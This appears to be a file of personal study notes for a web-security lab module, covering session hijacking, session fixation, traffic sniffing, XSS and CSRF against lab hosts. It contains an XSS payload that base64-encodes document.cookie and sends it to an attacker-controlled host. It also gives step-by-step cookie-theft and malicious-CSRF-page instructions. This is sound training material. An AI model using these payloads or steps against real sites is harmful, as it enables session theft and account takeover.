@@ -1,0 +1,116 @@
+SESSION SECURITY:
+
+A unique session identifier (Session ID) or token is the basis upon which user sessions are generated and distinguished.
+
+___________________________________________________________________________________________________________
+
+Session Hijacking
+
+An attacker can obtain a victim's session identifier using several methods, with the most common being:
+- Passive Traffic Sniffing
+- Cross-Site Scripting (XSS)
+- Browser history or log-diving
+- Read access to a database containing session information
+------------------------------
+Session Attacks
+
+This module will cover different types of session attacks and how to exploit them. These are:
+
+- Session Hijacking 
+- Session Fixation
+- XSS (Cross-Site Scripting)
+- CSRF (Cross-Site Request Forgery)
+- Open Redirects
+-----------------------------
+CONFIGURE LAB FOR VHOSTS:
+
+IP=[target ip]
+printf "%s\t%s\n\n" "$IP" "xss.htb.net csrf.htb.net oredirect.htb.net minilab.htb.net" | sudo tee -a /etc/hosts
+cat /etc/hosts
+sudo nvim /etc/hosts
+
+-------------------------------------------------------------------------------
+ _________________
+|Session hijacking|
+|_________________|
+\\\\\\\\\\\\\\\\\\\
+we  have some credentials
+
+access with these credentials
+
+inspect code and we can see the cookie
+
+copy the cookie
+
+open a private or incognito window at the same website
+
+paste the logged user cookie at "value" and charge the website, get the session hijacking!
+----------------------
+ ________________
+|Session fixation|
+|open redirect   |
+|________________|
+\\\\\\\\\\\\\\\\\\
+http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN VALUE>
+Inspect code and we  notice that the application uses a session cookie named PHPSESSID and that the cookie's value is the same as the token parameter's value on the URL.
+
+If any value or a valid session identifier specified in the token parameter on the URL is propagated to the PHPSESSID cookie's value, we are probably dealing with a session fixation vulnerability.
+
+Open a New Private Window and navigate to http://oredirect.htb.net/?redirect_uri=/complete.html&token=IControlThisCookie
+
+Using Web Developer Tools (Shift+Ctrl+I in the case of Firefox), notice that the PHPSESSID cookie's value is IControlThisCookie
+
+To test for session fixation, we could try the following http://insecure.exampleapp.com/login?PHPSESSID=AttackerSpecifiedCookieValue
+
+will update PHPSESSID's value with the token parameter's value.
+-----------------------
+ ________________________
+| sesion idendtifiers    |
+|without user interaction|
+|________________________|
+\\\\\\\\\\\\\\\\\\\\\\\\\\
+These attacking techniques can be split into two categories:
+
+- Session ID-obtaining attacks without user interaction
+- Session ID-obtaining attacks requiring user interaction
+The process consist in use wireshark or another network sniffer, scan the login page when the victim get in the session
+
+- use wireshark to view the /js/query/min.js or similar file and copy the "auth session id"
+- open a new private window enter the same website, inspect page, go to storage and paste the value at "auth-session" "value" column.
+
+re-load the website in private window and get access
+
+---------------------------
+ ___________________
+|                   |
+|  XSS              |
+|___________________|
+\\\\\\\\\\\\\\\\\\\\\
+For a Cross-Site Scripting (XSS) attack to result in session cookie leakage, the following requirements must be fulfilled:
+
+- Session cookies should be carried in all HTTP requests
+- Session cookies should be accessible by JavaScript code (the HTTPOnly attribute should be missing)
+''''''''''''''''''
+xss payload using document.write: 
+<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
+
+---------------------------
+ ______________________
+|                      |
+|    csrf or xsrf      |
+|______________________|
+\\\\\\\\\\\\\\\\\\\\\\\\
+1- use burp to intercept at save profile information or profile data
+2- use a html malicious get script page
+3- save the script as .html
+4- create python server at localhost and 1337 port
+5- load the malicious script with the victim csrf token to login as the victim: 
+http://<VPN/TUN Adapter IP>:1337/notmalicious_get.html
+
+=========================================================================================================
+
+
+
+
+
+
